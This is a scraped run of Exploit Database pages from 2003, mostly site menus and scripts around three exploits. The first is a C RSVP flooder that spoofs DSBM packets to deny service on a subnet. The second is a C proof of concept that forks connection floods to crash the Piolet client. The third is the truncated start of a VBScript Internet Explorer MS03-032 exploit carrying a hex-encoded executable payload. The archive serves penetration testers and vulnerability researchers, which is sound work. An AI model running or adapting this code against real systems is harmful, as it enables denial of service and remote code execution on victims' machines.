<getopt.h>#include <stdio.h>#include <sys/types.h>#include <sys/socket.h>#include <netinet/ip.h>#include <netdb.h>#include <errno.h>#include <string.h>#include <arpa/inet.h>void usage(char *progname);void startattack(void);unsigned short in_chksum(unsigned short *pts, int nbytes);struct rsvphead{int flags:4;int version:4;char type:8;int checksum:16;char ttl:8;char reserved:8;int length:16;};struct rsvpdata{char buf[40];};struct header{struct iphdr ip;struct rsvphead rhead;struct rsvpdata rdata;};struct in_addr spoofed;int main(int argc, char *argv[]){int c;printf("RSVP Munger by Ste Jones from NetworkPenetration\n");printf("----------------------------------------------------\n");opterr = 0; //stop error messages from command linewhile ((c=getopt(argc, argv, "s:")) != -1){switch(c){case 's':	if(!inet_aton(optarg, &spoofed)){printf("Malformed IPaddress: %s\n",optarg);exit(1);}break;default:	usage(argv[0]);exit(1);break;}}for(;;){startattack();}exit(0);}void startattack(void){struct header heada;struct sockaddr_in sin;int sock;int on;int sinlen;int willing;unsigned char *sourceip;on = 1;willing = 4; //send willing four times then I_AM_DBSMprintf("\nSending %d I_AM_WILLING packets followed by I_AM_DSBMpackets every 5 seconds\n\n", willing);for(;;){memset(&heada, '\0', sizeof(heada));if(willing) printf("Creating I_AM_WILLING packet\n");else printf("Creating I_AM_DSBM packet\n");heada.ip.ihl = 5;heada.ip.version = 4;heada.ip.tos = 0xc0; //same options as set by MicrosoftRSVPif(willing) heada.ip.tot_len = htons(56);else heada.ip.tot_len = htons(64);heada.ip.id = 0x0000; //checksum calculate laterheada.ip.frag_off = 0;heada.ip.ttl = 1; //multicast uses ttl of 1heada.ip.protocol = 0x2e; //RSVP protocol numberheada.ip.check = 0;if(spoofed.s_addr){heada.ip.saddr = spoofed.s_addr;}else heada.ip.saddr = 0; //let kernel decideheada.ip.daddr = inet_addr("224.0.0.17");sourceip = (unsigned char *)&heada.ip.saddr;heada.rhead.flags   = 0;heada.rhead.version = 1;if(willing) heada.rhead.type    = 0x42; //I_AM_WILLINGelse heada.rhead.type    = 0x43; //I_AM_DSBMheada.rhead.checksum= 0x0000; //checksum calculated laterheada.rhead.ttl     = 0x01;heada.rhead.reserved= 0x00;if(willing) heada.rhead.length = 0x2400;else heada.rhead.length  = 0x2c00;heada.rdata.buf[0]  = 0x00;//lengthheada.rdata.buf[1]  = 0x08;//lengthheada.rdata.buf[2]  = 0x2a;//0x2a01 = DSBM IP ADDRheada.rdata.buf[3]  = 0x01;heada.rdata.buf[4]  = sourceip[0];//IP addressheada.rdata.buf[5]  = sourceip[1];//if not spoofed DSBM IPADDR = 0heada.rdata.buf[6]  = sourceip[2];//heada.rdata.buf[7]  = sourceip[3];//heada.rdata.buf[8]  = 0x00;//lengthheada.rdata.buf[9]  = 0x0c;//lengthheada.rdata.buf[10]  = 0xa1;//0a101 = RSVP_HOP_L2, IEEEcanonical addrheada.rdata.buf[11]  = 0x01;heada.rdata.buf[12]  = 0x00; //mac addrheada.rdata.buf[13]  = 0x11; //heada.rdata.buf[14]  = 0x22; //heada.rdata.buf[15]  = 0x33; //heada.rdata.buf[16]  = 0x44; //heada.rdata.buf[17]  = 0x55; //heada.rdata.buf[18]  = 0x00; //heada.rdata.buf[19]  = 0x00; //heada.rdata.buf[20]  = 0x00; //lengthheada.rdata.buf[21]  = 0x08; //lengthheada.rdata.buf[22]  = 0x2b; // 0x2b01 = SMB_Priorityheada.rdata.buf[23]  = 0x01; //heada.rdata.buf[24]  = 0x00; //priorityheada.rdata.buf[25]  = 0x00; //priorityheada.rdata.buf[26]  = 0x00; //priorityif(!willing)heada.rdata.buf[27]  = 0xff; //priority 255else heada.rdata.buf[27] = 0xff; //priority//priority = 255//highest possible priority//if server has lower priority vulernable to DoSif(!willing){heada.rdata.buf[28]  = 0x00; //lengthheada.rdata.buf[29]  = 0x08; //lengthheada.rdata.buf[30]  = 0x2c; //0x2c01 = DSBM timerintervalsheada.rdata.buf[31]  = 0x01;heada.rdata.buf[32]  = 0x00; //retransmit timeheada.rdata.buf[33]  = 0x00; //heada.rdata.buf[34]  = 0x0f; //0x0f?heada.rdata.buf[35]  = 0x05; //time 5 seconds}heada.ip.check = in_chksum((unsigned short *)&heada.ip,20);sin.sin_family = AF_INET;sin.sin_port = htons(0);sin.sin_addr.s_addr = inet_addr("224.0.0.17");if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){printf("Socket error %s\n",strerror(errno));exit(1);}if((setsockopt(sock,IPPROTO_IP, IP_HDRINCL, &on, sizeof(on))) < 0){printf("Setsockopt error %s\n",strerror(errno));exit(1);}sinlen = sizeof(sin);if(willing){if(sendto(sock, &heada, 56, 0, (struct sockaddr *)&sin, sinlen) != 56){printf("Sento error\n");exit(1);}printf("Sent I_AM_WILLING packet\n");}else{if(sendto(sock, &heada, 64, 0, (struct sockaddr *)&sin, sinlen) != 64){printf("Sento error\n");exit(1);}printf("Sent I_AM_DBSM packet\n");}close(sock);if(willing) willing--;sleep(5);}}void usage(char *progname){printf("\n%s\n", progname);printf("\t-s <ip address> Spoof source IP address\n");printf("\n");exit(1);}unsigned short in_chksum(unsigned short *pts, int nbytes){register long sum;u_short oddbyte;register u_short answer;sum = 0;while(nbytes > 1){sum += *pts++;nbytes -=2;}if(nbytes == 1){oddbyte = 0;*((u_char *) &oddbyte) = *(u_char *)pts;sum += oddbyte;}sum = (sum >> 16) + (sum &0xffff);sum += (sum >>16);answer = ~sum;return(answer);}// milw0rm.com [2003-08-15]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 82
Piolet Client 1.05 - Remote Denial of Service - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDPiolet Client 1.05 - Remote Denial of ServiceEDB-ID:82CVE:EDB Verified:Author:Luca ErcoliType:dosExploit:/Platform:WindowsDate:2003-08-20Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*************************************************************                      Piolet client v1.05 Remote Denial of Service                    **               Proof of Concept by Luca Ercoli  luca.ercoli[at]inwind.it             *************************************************************/#include <stdio.h>#include <string.h>#include <netinet/in.h>#include <sys/socket.h>#include <sys/types.h>int ck,port=701,sd,cx=0,contatore=0,prec;struct sockaddr_in pilot_client;void ending(char *client){int i;pilot_client.sin_family = AF_INET;pilot_client.sin_port = htons((u_short)port);pilot_client.sin_addr.s_addr = (long)inet_addr(client);for(i = 0; i < 100; i++){sd = socket(AF_INET, SOCK_STREAM, 0);ck = connect(sd, (struct sockaddr *) &pilot_client, sizeof(pilot_client));if(ck != 0) {prec = 0;if (prec == 0) contatore++;if (prec == 1) contatore = 0;if (contatore > 13) {printf("! Remote client seems to be crashed.\n");exit(0);}}if(ck == 0) prec = 1;close(sd);}}void kill_pilot(char *stringa){short i;pilot_client.sin_family = AF_INET;pilot_client.sin_port = htons((u_short)port);pilot_client.sin_addr.s_addr = (long)inet_addr(stringa);for(i = 0; i < 50; i++){sd = socket(AF_INET, SOCK_STREAM, 0);ck = connect(sd, (struct sockaddr *) &pilot_client, sizeof(pilot_client));if(ck != 0) exit(0);close(sd);}}int main(int argc, char **argv){short i;prec = 0;if(argc < 2){printf("\nUsage: %s <client-ip>\n", argv[0]);exit(0);}prec=0;printf ("\n\n+ DoS Started...\n");printf("+ Flooding remote client...\n");for (i=0; i<12; i++)  if(!fork()) kill_pilot(argv[1]);printf ("+ Ending...\n");ending(argv[1]);}// milw0rm.com [2003-08-20]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 83
Microsoft Internet Explorer - Object Data Remote (MS03-032) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Internet Explorer - Object Data Remote (MS03-032)EDB-ID:83CVE:2003-0701EDB Verified:Author:malwareType:remoteExploit:/Platform:WindowsDate:2003-08-21Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED<title>by malware M03-032 Exploit</title><script language=vbs>self.MoveTo 5000,5000dim v(24)cut=""v(0)="4D,5A,44,01,05,y,02,y,20,y,21,y,z2,75,y2,02,y2,99,y3,3E,y3,01,y,FB,30,6A,72,y1C,79,y3,9E,y1CD,66,33,C0,33,z,8C,D3,83,C3,20,B9,70,3F,8E,C3,F3,66,AB,8C,C0,8E,D8,B8,y,A0,8E,C0,C3,66"v(1)=",B9,y,FA,y2,66,BF,y4,66,BE,81,02,y2,66,33,C0,67,8A,9F,40,01,y2,03,D8,C1,E3,04,2B,D8,2B,D8,66,C1,C8,10,03,D8,AC,03,D8,C1,EB,05,67,88,1F,47,E2,DE,C3,B9,80,3E,33,z,33,F6,F3,66,A5,C3"v(2)=",1E,06,8C,D8,05,A0,0F,8E,C0,B8,0F,y,8E,D8,33,C0,67,8A,03,8B,F0,BF,0A,y,B9,2C,01,F3,A4,8B,F0,83,C7,14,B9,2C,01,F3,A4,07,1F,C3,B0,13,CD,10,BA,0F,y,8E,DA,BE,48,03,BA,C8,03,32,C0,EE"v(3)=",42,B9,y,03,F3,6E,E8,5C,z,66,33,DB,E8,B5,z,53,E8,6E,z,BA,DA,03,EC,A8,08,75,FB,EC,A8,08,74,FB,E8,96,z,5B,FE,C3,B4,01,CD,16,74,E0,B8,03,y,CD,10,B8,y,4C,CD,21,yF,B1,C0,90,1D,7B"v(4)=",88,D9,26,6B,C2,C1,88,B8,C9,A4,3A,8B,7F,93,8E,5C,30,DB,1F,3A,7F,8D,57,33,C1,8C,B1,77,98,89,DA,6B,D7,5C,86,7C,AB,A8,8E,22,D0,D9,A0,5E,85,D9,2E,A2,C3,6C,63,6C,45,24,BF,21,97,8E,D0,8A"v(5)=",1A,BF,C0,9B,16,26,B2,9D,D7,8A,2D,B3,8C,24,49,A5,8D,29,9F,2D,87,5C,C6,C7,5A,38,97,96,2D,2A,15,CD,A5,73,CC,AE,A6,5D,75,A4,22,B3,9F,8C,D7,77,26,A7,56,B0,B8,64,84,1B,5A,D9,1D,CE,AF,36"v(6)=",3B,98,7C,C3,38,4C,C0,1A,22,1E,CF,46,79,622,1D,78,D7,CF,6D,DA,7F,6C,A2,25,97,C8,4B,C2,C8,33,70,A5,29,1C,19,BB,A9,69,18,A3,34,9F,51,63,33,1B,3A,7D,57,81,BD,20,A9,D5,23,19,55,4C,55,AA"v(7)=",62,19,A1,89,23,2B,6B,30,72,92,39,52,94,A8,35,6E,57,CA,CC,C8,CB,9B,C1,71,46,6B,61,6B,2A,7E,71,C7,49,AD,3A,4F,AB,C1,5F,15,67,A7,C4,3C,87,90,59,8A,D7,64,C8,21,BE,1B,6C,90,B0,D8,73,91"v(8)=",50,75,41,3C,4C,56,D6,3F,A2,2C,1C,B9,65,D8,76,C6,38,B5,51,B9,33,B4,48,64,84,56,A8,A0,AE,1D,9C,C2,1B,83,93,DB,59,54,22,75,70,AF,9E,19,7E,78,34,7D,5D,AA,A1,5E,55,46,BB,BE,14,C5,1A,45"v(9)=",5E,14,3B,C5,7B,6D,BB,40,81,AD,7A,D2,4A,8E,3D,B4,D6,5C,A9,C6,26,C7,98,58,C6,7D,BB,15,BE,78,CF,C5,74,7C,75,AA,2B,77,25,C1,5F,A7,23,C1,8A,CF,D7,49,55,54,9B,84,8A,55,5D,35,1F,71,25,92"v(10)=",79,D5,CF,82,2E,23,5D,8B,35,8A,4E,76,1C,C6,7E,26,19,AF,A7,32,38,CE,49,2C2,D0,14,67,39,2D,29,83,33,82,CE,AD,CF,CD,28,1A,1E,38,B0,CE,41,2E,7B,48,4C,2B,D2,92,BD,CB,97,24,B8,39,C2,9C,5A"v(11)=",D9,D3,63,17,D7,71,18,302,96,67,1C,9E,50,45,58,30,8B,C4,7F,85,9A,4C,C9,58,B3,1F,D3,53,20,24,C9,D6,D0,A8,5A,A1,48,92,7B,D3,70,B2,72,2A,CF,B5,8F,C1,63,2D,1F,6E,1C,B6,B2,C0,2E,B6,26,19"v(12)=",B5,20,B9,5C,14,3D,C9,2A,51,20,7A,3B,B3,2B,CE,B8,3F,90,A8,2F,CF,4E,CF,68,28,1B,14,BF,6F,A2,1C,85,88,D0,AA,5E,18,B7,1A,1E,C6,7F,D9,94,6D,AC,B5,4C,59,B0,6E,C0,4D,3D,A4,C0,5A,90,65,38"v(13)=",53,38,61,81,CA,A4,3C,96,28,49,78,86,54,2F,63,2E,42,66,57,28,2B,95,BF,58,5E,51,95,5E,A2,3D,71,C9,A8,CD,AE,C1,54,D4,BC,2A,9C,76,9E,43,9E,84,92,AB,A4,3B,1B,BF,B9,75,65,5E,B3,3C,8C,94"v(14)=",41,B5,93,B8,59,DB,C2,87,D5,76,60,61,3B,47,A9,15,7E,96,A2,38,60,62,80,9B,2A,5E,CB,A7,6F,47,83,36,82,8F,72,18,37,8F,20,4E,D8,9E,B1,9B,85,3E,A3,70,5F,8A,54,5B,2D,C6,A8,A7,68,8D,94,1E"v(15)=",44,A4,16,83,BC,99,58,3E,C5,9E,15,4F,9C,78,3A,6A,7F,2A,32,9F,48,30,47,59,6D,3D,AA,48,7D,AE,AF,DB,72,A8,D9,D1,2A,98,B5,49,BC,36,6B,17,45,D2,3E,DB,37,B1,67,80,A0,99,9D,93,89,93,90,88"v(16)=",90,47,58,65,5A,C4,C8,80,2E,80,A0,8F,77,9A,5E,4F,D3,B3,92,3A,81,1B,4D,CD,2B,D8,A1,5B,9F,63,3E,D6,A7,17,55,7C,73,C9,90,C5,33,85,82,B2,39,78,64,C1,3C,C2,77,80,4D,21,37,96,29,69,4A,C6"v(17)=",4A,53,C2,65,94,68,54,8C,A7,68,74,40,79,C7,512,63,8E,8D2,92,5B,37,30,722,47,A2,8E,B1,84,51,1D,A2,4B,26,53,58,7C,5C,B